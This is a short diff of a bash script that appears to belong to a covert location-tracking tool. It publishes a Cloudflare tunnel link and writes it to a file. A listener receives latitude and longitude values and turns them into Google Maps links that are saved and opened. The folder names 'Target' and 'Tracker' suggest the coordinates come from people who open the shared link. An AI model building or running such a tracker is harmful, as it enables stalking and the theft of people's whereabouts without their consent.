@@ -1,5 +1,7 @@
 #!/usr/bin/env bash
 FILE=/root/Desktop/Target/server/link.txt
+echo "" > /root/Desktop/Tracker/server/links.txt
+echo "" > /root/Desktop/Tracker/server/maplink.txt
 CWD=`pwd`;script="$0"; arg1="$1"; arg2="$2" arg3="$3"; OS=`uname -o`; arch=`uname -m`
 S0="\033[30m"; B0="\033[40m"; S1="\033[31m"; B1="\033[41m"; S2="\033[32m"; B2="\033[42m"; S3="\033[33m"; B3="\033[43m"; S4="\033[34m"; B4="\033[44m"; S5="\033[35m"; B5="\033[45m"; S6="\033[36m"; B6="\033[46m"; S7="\033[37m"; B7="\033[47m"; R0="\033[0;00m"
 if [[ ${OS,,} == *'android'* ]]; then
@@ -70,7 +72,7 @@ while true; do
   link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${CWD}/cloudflared-log")
   if [[ ! -z ${link} ]]; then
     printf "${S5}Forwading on${S1}::${S7} %s${R0}\n" $link
-    printf $link > link.txt
+    printf $link > links.txt
     break
   else
     sleep 0.125
@@ -94,7 +96,7 @@ listener() {
     :
   else
     map="https://maps.google.com/maps?q=""${Latitude}","${Longitude}"
-    echo $map > maplink.txt
+    echo "chromium $map" > maplink.txt
     xdg-open """https://maps.google.com/maps?q="${Latitude}","${Longitude}""""
   fi
   listener
